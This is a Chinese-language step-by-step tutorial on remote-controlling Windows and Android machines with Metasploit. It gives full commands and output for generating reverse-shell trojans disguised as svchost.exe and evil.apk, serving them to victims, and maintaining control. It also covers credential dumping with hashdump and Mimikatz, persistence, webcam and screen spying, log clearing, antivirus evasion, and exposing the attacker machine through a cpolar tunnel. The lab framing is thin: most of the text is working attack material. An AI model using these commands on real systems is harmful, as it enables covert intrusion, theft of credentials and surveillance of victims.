第零章：前置准备

0.1 实验环境

角色系统说明
攻击机Kali Linux渗透测试专用系统，预装 Metasploit、msfvenom 等
靶机（Windows）Windows 10 / 11被测试的 Windows 机器，建议用虚拟机
靶机（Android）Android 10+被测试的安卓设备，建议用模拟器

0.2 网络要求

  • 攻击机和靶机必须在同一局域网（或通过内网穿透可达）
  • 靶机需要能访问攻击机的 IP 地址
  • 虚拟机建议使用 NAT 或 Host-Only 网络模式
  • 做实验时不要暴露到公网，否则可能被他人利用

0.3 查看 Kali 的 IP 地址

在 Kali 终端中执行以下任一命令：

# 方式一（推荐，信息最全）
ifconfig
# 找到 eth0 或 ens33 中的 inet 地址，比如 192.168.1.100

# 方式二（简洁）
hostname -I
# 直接输出 IP，比如 192.168.1.100

# 方式三（新版 Linux）
ip addr show
# 查看 inet 后面的地址
注意：每次重启 Kali 或更换网络后 IP 可能变化。生成木马之前务必重新确认 IP，否则靶机连不过来。

0.4 常用端口速查

端口用途
4444Metasploit 默认监听端口（可以改成其他）
80Apache Web 服务默认端口
22SSH 远程连接
3389Windows 远程桌面（RDP）
5555ADB（Android Debug Bridge）默认端口

第一章：Windows 远控实战

攻击流程总览

生成木马(msfvenom) → 启动Web服务(Apache) → 启动监听(msfconsole)
→ 靶机下载并运行 → 获取Meterpreter会话 → 后渗透操作 → 清理痕迹

步骤 1：切换到 root 权限

sudo su

为什么需要 root：Apache 的 80 端口是特权端口（1024 以下），非 root 无法监听。同时木马需要放到 /var/www/html/ 目录，这个目录也需要 root 权限才能写入。

步骤 2：用 msfvenom 生成 Windows 木马

基本命令格式：

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=你的KaliIP LPORT=监听端口 -f exe -o 输出文件名.exe

参数逐一说清楚：

参数含义怎么填
-pPayload 类型windows/x64/meterpreter/reverse_tcp（64位系统）或 windows/meterpreter/reverse_tcp（32 位）
LHOST你的 Kali 的 IP 地址用 ifconfig 查出来的地址，如 192.168.1.100
LPORT监听端口自由设定，常用 4444
-f输出格式exe（Windows 可执行文件）
-o输出路径直接放到 Apache 目录，如 /var/www/html/svchost.exe

实际敲的命令（替换 IP 为你的）：

# 64 位 Windows（大部分情况用这个）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o /var/www/html/svchost.exe

# 32 位 Windows（兼容性更好，但功能少一些）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o /var/www/html/svchost.exe

运行后你应该看到类似这样的输出：

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: /var/www/html/svchost.exe

Payload size 510 bytes意思是木马核心只有 510 字节，加上壳一共 7KB，非常小巧。

Payload 类型怎么选：

Payload什么时候用
windows/x64/meterpreter/reverse_tcp目标 64 位 Windows，基础场景
windows/meterpreter/reverse_tcp目标 32 位 Windows
windows/x64/meterpreter/reverse_https需要绕过防火墙 / 杀软检测，走 HTTPS 加密
windows/x64/meterpreter_reverse_tcpstageless 版，单文件更大但更稳定

步骤 3：启动 Apache Web 服务

靶机需要通过 HTTP 下载木马文件，所以 Kali 上要跑一个 Web 服务。

# 启动 Apache
systemctl start apache2.service

# 查看状态，确保是 active (running)
systemctl status apache2.service

# 设置开机自启（可选，下次不用手动启动）
systemctl enable apache2.service

启动后在 Kali 浏览器中打开 http://你的IP/svchost.exe，如果能触发下载，说明 Web 服务正常。

如果 Apache 没装：apt update && apt install apache2 -y

步骤 4：启动 Metasploit 并配置监听

监听器的作用是等靶机运行木马后主动连回来。先打开 MSF 控制台：

msfconsole

看到 msf6 > 提示符后，逐条输入：

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
show options
exploit -j -z

每条命令的作用：

命令做什么
use exploit/multi/handler加载通用监听模块（专门等反弹连接用的）
set payload ...必须和生成木马时用的 payload 一模一样
set LHOST监听哪个 IP（如果 Kali 有多个网卡，设 0.0.0.0 表示全听）
set LPORT监听端口，必须和生成木马时一致
show options检查当前配置，确认 LHOST 和 LPORT 是对的
exploit -j -z-j 后台运行，-z 不自动进入会话

预期输出：

[*] Started reverse TCP handler on 192.168.1.100:4444
小提示：如果你想前台运行（能看到实时上线信息），直接用 exploit 不加 -j -z。

步骤 5：靶机下载并运行木马

靶机操作（在 Windows 虚拟机上）：

  1. 打开浏览器，输入 http://192.168.1.100/svchost.exe
  2. 浏览器会提示「此文件可能危害计算机」→ 点「保留」
  3. 找到下载的文件，双击运行
Windows Defender 可能会拦截：测试环境建议临时关闭实时保护（设置 → 更新和安全 → Windows 安全中心 → 病毒和威胁防护 → 管理设置 → 关闭实时保护）。实验做完记得开回来。

靶机运行木马后，Kali 端会出现：

[*] Sending stage (200262 bytes) to 192.168.1.105
[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.105:49876)

这就说明上线成功了！靶机的 49876 端口主动连到了你 Kali 的 4444 端口。Session 1 就是你的第一个会话。

步骤 6：进入 Meterpreter 会话

sessions              # 列出所有活跃会话
sessions -i 1         # 进入会话 ID=1

进入后提示符会变成 meterpreter >，说明你已经可以远程控制靶机了。

sessions 命令常用操作：

命令作用
sessions列出所有会话（看有哪些机器上线了）
sessions -i 1进入会话 1
sessions -k 1终止会话 1（断掉靶机连接）
sessions -n 名字给会话起个名字，方便管理
background在 meterpreter 中执行，把当前会话放后台

步骤 7：测试完成后的清理

# 在 Meterpreter 中（可选）
meterpreter > clearev                # 清除 Windows 事件日志

# 退出会话
meterpreter > exit

# 在 MSF 控制台中停止监听
msf6 > jobs -K                      # 停止所有后台任务

# 停止 Apache
sudo systemctl stop apache2.service

# 确认 Apache 已停止
sudo systemctl is-active apache2.service
# 应输出：inactive

# 删除木马文件
sudo rm /var/www/html/svchost.exe

第二章：Android 远控实战

攻击流程总览

生成APK(msfvenom) → 签名APK(jarsigner) → 靶机安装运行
→ 监听上线 → Meterpreter会话 → 核心功能演示

步骤 1：生成 Android APK 木马

msfvenom -p android/meterpreter/reverse_tcp LHOST=你的KaliIP LPORT=4444 -o evil.apk

实际示例：

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o evil.apk

输出示例：

[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
[-] No arch selected, selecting arch: dalvik from the payload
No encoder specified, outputting raw payload
Payload size: 10146 bytes

Android Payload 选项：

Payload说明
android/meterpreter/reverse_tcp标准 TCP 反弹（推荐，最常用）
android/meterpreter/reverse_httpsHTTPS 加密反弹，更难被检测
android/meterpreter_reverse_tcpStageless 版本（单文件，体积更大但更稳）

步骤 2：签名 APK（关键步骤）

Android 系统禁止安装未签名的 APK。如果直接把 evil.apk 发给靶机，会提示「解析失败」或「安装包破损」。

第 1 小步：生成签名证书（只需做一次）

keytool -genkey -v -keystore my.keystore -alias my -keyalg RSA \
  -keysize 2048 -validity 9125 \
  -noprompt \
  -dname "CN=Test, OU=Dev, O=Lab, L=City, S=State, C=CN" \
  -storepass 123456 -keypass 123456

参数说明：

参数含义
-genkey生成密钥对
-keystore my.keystore密钥库存到哪个文件
-alias my密钥别名（后面签名时用）
-validity 9125证书有效期，9125 天≈25 年
123456密钥库密码（实验用简单密码就行）

第 2 小步：用证书签名 APK

jarsigner -verbose \
  -keystore my.keystore \
  -storepass 123456 \
  -keypass 123456 \
  -signedjar signed.apk \
  evil.apk \
  my

signed.apk 就是签名后可以安装的 APK。evil.apk 是未签名的，不能安装。

第 3 小步：验证签名是否成功

jarsigner -verify -verbose signed.apk

看到 jar verified. 就说明签名正确。

步骤 3：启动 MSF 监听

msfconsole -q -x "
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit -j -z
"

-q 是安静启动（不显示 logo），-x 是执行后面的命令。

预期输出：

[*] Started reverse TCP handler on 192.168.1.100:4444

步骤 4：靶机安装 APK

方式一：ADB 安装（推荐，适合模拟器）

# 确认设备已连接
adb devices
# 输出：emulator-5554   device

# 推送到设备
adb push signed.apk /sdcard/

# 安装
adb install signed.apk

# 如果更新已有 APK（覆盖安装）
adb install -r signed.apk

ADB 环境配置（Windows）：

  1. 下载 Android SDK Platform Tools
  2. 解压到 C:\platform-tools\
  3. 把 C:\platform-tools\ 加入系统 PATH 环境变量
  4. 打开 CMD 验证：adb version

方式二：直接传文件安装

  1. 把 signed.apk 通过微信/QQ/网盘传到靶机
  2. 靶机上找到 APK 文件，点击安装
  3. 系统会提示「未知来源」→ 去设置里允许「安装未知应用」
  4. 安装完成后桌面出现应用图标

推荐模拟器：

模拟器特点
Android Studio AVD官方模拟器，兼容性最好
MuMu 模拟器性能好，适合游戏测试
夜神模拟器支持多开，自带 Root
Genymotion专业安卓虚拟化平台

步骤 7：一键脚本（可选）

把下面内容保存为 android_rush.sh，一次搞定生成+签名+提示监听命令：

#!/bin/bash
# Android 远控一键脚本
# 用法：chmod +x android_rush.sh && ./android_rush.sh

IP=$(hostname -I | awk '{print $1}')
PORT=4444

echo "=== Kali IP: $IP ==="
echo "=== 监听端口: $PORT ==="
echo ""

echo "[1/3] 生成 APK..."
msfvenom -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -o evil.apk

echo "[2/3] 签名 APK..."
if [ ! -f my.keystore ]; then
    keytool -genkey -keystore my.keystore -alias my -keyalg RSA \
      -keysize 2048 -validity 9125 -noprompt \
      -dname "CN=Test, OU=Dev, O=Lab, L=City, S=State, C=CN" \
      -storepass 123456 -keypass 123456
fi
jarsigner -keystore my.keystore -storepass 123456 -keypass 123456 \
  -signedjar signed.apk evil.apk my

echo "[3/3] 完成！"
echo ">>> 签名完成：$(pwd)/signed.apk"
echo ""
echo ">>> 在新终端启动监听："
echo "msfconsole -q -x \"use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $PORT; exploit -j -z\""
chmod +x android_rush.sh && ./android_rush.sh

第三章：Meterpreter 后渗透完整指令手册

以下所有命令均在 meterpreter > 提示符下执行。标记 (W) 的仅 Windows，标记 (A) 的仅 Android。

3.1 文件系统操作

命令做什么示例
ls列出当前目录ls C:\\Users\\
pwd当前工作目录（目标机）pwd
cd 路径切换目录cd C:\\Users\\Admin\\Desktop
cat 文件查看文件内容cat passwords.txt
edit 文件编辑文件（打开 vim）edit config.ini
mkdir 目录创建目录mkdir C:\\temp

3.2 系统信息 & 状态

命令做什么
sysinfo系统信息（OS 版本、架构、域名）
getuid当前用户（如 NT AUTHORITY\SYSTEM 表示已提权）
getpidMeterpreter 所在进程的 PID
getprivs列出当前进程拥有的权限
ps列出所有运行中的进程
pgrep 名字按名称搜索进程
kill PID结束指定进程

idletime用户空闲时间（判断是否有人在用电脑）

execute 参数详解：

参数作用
-f 程序名指定要执行的程序
-i交互模式（可以看到输出）
-H隐藏窗口（后台运行，靶机看不出）
-c 参数传递命令行参数

3.3 权限提升 & 凭据获取 (W)

meterpreter > getsystem
# 尝试提权到 NT AUTHORITY\SYSTEM（最高权限）
# 常用技术：命名管道模拟、令牌复制

meterpreter > getprivs
# 关键权限说明：
# SeDebugPrivilege       → 可调试/注入任意进程
# SeImpersonatePrivilege → 可模拟客户端令牌

meterpreter > hashdump
# 导出 SAM 中的密码哈希（需 SYSTEM 权限）
# 输出格式：用户名:RID:LM哈希:NTLM哈希:::

meterpreter > load kiwi              # 加载 Mimikatz（Kiwi 版）
meterpreter > creds_all              # 导出所有缓存的凭据
meterpreter > lsa_dump               # 导出 LSA 中的凭据
meterpreter > creds_wdigest          # 导出 WDigest 凭据

3.4 进程迁移 & 持久化 (W)

meterpreter > migrate 目标PID
# 把 Meterpreter 注入到稳定进程（如 explorer.exe）
# 迁移后原进程退出，payload 在新进程中存活

meterpreter > run post/windows/manage/migrate
# 自动选择合适进程迁移

# 安装启动项持久化（靶机每次开机自动回连）
meterpreter > run persistence -U -i 5 -p 4444 -r 你的KaliIP
# -U: 用户登录时启动
# -i 5: 每 5 秒尝试回连
# -p 4444: 回连端口
# -r IP: 回连地址

迁移最佳实践：

  • 优先迁移到 explorer.exe（用户态，长期存活）
  • 不要迁移到杀软进程（会触发自我保护）
  • 32 位 payload 只能迁移到 32 位进程，64 位同理

3.5 屏幕 / 摄像头 / 音频

meterpreter > screenshot             # 截图，保存为 JPEG
meterpreter > screenshare            # 实时桌面共享（浏览器看）
meterpreter > webcam_list            # 列出所有摄像头
meterpreter > webcam_snap            # 默认摄像头拍照
meterpreter > webcam_stream          # 实时视频流

第四章：Kali + cpolar 实现 SSH 远程连接

适用场景：Kali 在内网（没有公网 IP），你人在外面想远程 SSH 连上 Kali 操作。

原理示意

你（外网任意地方）→ cpolar公网域名:端口 → cpolar隧道 → Kali本地SSH(22端口)

4.1 启动并配置 SSH 服务

# Kali 上启动 SSH
sudo systemctl start ssh
sudo systemctl status ssh         # 确认 Active: active (running)
sudo systemctl enable ssh         # 开机自启

配置允许密码登录：

sudo vim /etc/ssh/sshd_config

找到并修改：

PasswordAuthentication yes       # 允许密码认证
PermitRootLogin yes              # 允许 root 登录（建议用普通用户）
PubkeyAuthentication yes         # 允许密钥认证

修改后重启 SSH：

sudo systemctl restart ssh
安全建议：修改默认端口（22→2222）减少扫描；使用强密码；限制登录尝试次数 MaxAuthTries 3。

4.2 注册 cpolar

  1. 访问 cpolar 官网 注册账号
  2. 登录后进入 仪表盘
  3. 在「验证」页面找到你的 Authtoken（一串很长的字符）

4.3 安装 cpolar

curl -L https://www.cpolar.com/static/downloads/install-release-cpolar.sh | sudo bash
cpolar version    # 验证安装成功

4.4 配置认证

cpolar authtoken 你的Authtoken
# 例子：cpolar authtoken ZjViODQwZWYtYjI0NS00xxxxxxxxxxxxx

配置一次即可，信息存在 ~/.cpolar/cpolar.yml。

4.5 创建 SSH 隧道

cpolar tcp 22

输出：

Forwarding     tcp://0.tcp.cpolar.cn:12345 -> localhost:22

这个地址就是你的公网 SSH 地址：

ssh 用户名@0.tcp.cpolar.cn -p 12345

4.6 后台运行 & 开机自启

# 方式一：systemd
sudo systemctl enable cpolar
sudo systemctl start cpolar

# 方式二：screen 保持后台
screen -S cpolar
cpolar tcp 22
# 按 Ctrl+A 再按 D（分离但不停止）
# 恢复：screen -r cpolar

4.7 Web 管理界面

浏览器打开 http://127.0.0.1:9200，可以查看所有隧道、流量统计、创建/删除隧道。

4.8 固定 TCP 地址（Pro 版）

免费版每次重连域名随机变。如需固定地址，升级 Pro 后在仪表盘「预留」中创建固定 TCP 地址，然后配置：

# ~/.cpolar/cpolar.yml
tunnels:
  ssh:
    proto: tcp
    addr: 22
    remote_addr: 你的固定地址.cpolar.cn
    remote_port: 你的固定端口

4.9 同时配置多个隧道

# ~/.cpolar/cpolar.yml
authtoken: 你的token
tunnels:
  ssh:
    addr: 22
    proto: tcp
    region: cn_vip
  web:
    addr: 80
    proto: http
    region: cn_vip
  vnc:
    addr: 5901
    proto: tcp
    region: cn_vip
cpolar start-all    # 启动所有隧道

第五章：故障排查

5.1 木马生成失败

问题原因解决
msfvenom: command not foundMetasploit 未安装apt install metasploit-framework -y
文件大小为 0权限不足用 sudo 或切到 root
No space left on device磁盘满了df -h 检查，清旧文件

5.2 靶机运行后不上线

原因检查方法
防火墙拦截临时关闭 Windows Defender 防火墙
IP 填错了用 ifconfig 重新确认 Kali IP，重新生成木马
端口没在监听ss -tlnp | grep 4444 检查
网络不通靶机 ping Kali IP 测试连通性
Payload 不一致生成和监听两边的 payload 必须完全一样
架构不匹配64 位 payload 跑在 32 位系统会失败，换 32 位

5.3 Apache 无法启动

# 检查 80 端口是否被占用
sudo ss -tlnp | grep :80

# 如果被占，改端口
sudo vim /etc/apache2/ports.conf
# 把 Listen 80 改成 Listen 8080
sudo systemctl restart apache2

5.4 会话不稳定 / 频繁断开

原因解决
网络波动TCP 对网络质量敏感，换 reverse_https 试试
杀软查杀用 Veil、Shellter 做免杀
进程被杀迁移到稳定进程：migrate 目标PID
超时设置set SessionCommunicationTimeout 0 关闭超时

5.5 Android APK 无法安装

问题原因解决
「解析失败」APK 没签名回到步骤 2.2 签名
「未知来源」系统禁止侧载设置→安全→允许「未知来源」
「安装包破损」下载不完整重新生成并签名
「版本过低」SDK 不兼容检查 Android 版本（需 6.0+）

5.6 cpolar 连接失败

问题原因解决
authtoken invalidtoken 错或过期仪表盘重新复制
外网不通SSH 没运行systemctl start ssh
显示 offline本地服务没监听ss -tlnp | grep 22
频繁断开免费版限制升级 Pro 或用心跳
